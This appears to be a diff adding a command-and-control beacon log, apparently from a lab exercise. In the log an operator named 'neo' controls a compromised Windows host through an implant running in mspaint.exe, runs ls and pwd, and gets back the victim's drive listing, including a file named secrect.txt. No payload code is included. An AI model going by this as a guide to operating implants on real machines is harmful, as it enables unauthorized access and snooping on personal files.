@@ -1,0 +1,25 @@
+12/15 15:32:45 UTC [metadata] 192.168.1.12 <- 192.168.1.12; computer: DESKTOP-DVHN6TG; user: david; process: mspaint.exe; pid: 12280; os: Windows; version: 10.0; build: 19044; beacon arch: x64 (x64)
+12/15 15:33:12 UTC [input] <neo> ls
+12/15 15:33:12 UTC [task] <> Tasked beacon to list files in .
+12/15 15:33:44 UTC [checkin] host called home, sent: 19 bytes
+12/15 15:33:44 UTC [output]
+E:\\*
+D	0	03/18/2022 10:04:41	$RECYCLE.BIN
+F	927232	12/15/2022 20:43:10	a.exe
+F	282	02/01/2021 15:19:34	desktop.ini
+D	0	10/15/2020 19:13:47	laragon
+D	0	10/28/2021 16:39:26	Lesson
+F	515	01/04/2022 14:58:25	Local Disk (D) - Shortcut.lnk
+D	0	12/05/2021 22:21:13	Programs
+F	23	12/15/2022 21:57:23	secrect.txt
+D	0	03/18/2022 09:57:51	System Volume Information
+D	0	12/25/2021 13:16:02	TranMinhTung
+D	0	12/05/2021 22:22:38	WindowsImageBackup
+D	0	10/17/2020 22:20:02	__MACOSX
+F	162	04/16/2020 19:57:14	~$an Minh Huy 6624.docx
+F	162	07/13/2021 03:15:45	~$KH-lo_hong_RSA_HoanThien.docx
+F	812169	04/16/2020 19:57:14	~WRL1983.tmp
+
+
+12/15 15:33:56 UTC [input] <neo> pwd
+12/15 15:33:56 UTC [task] <> Tasked beacon to print working directory
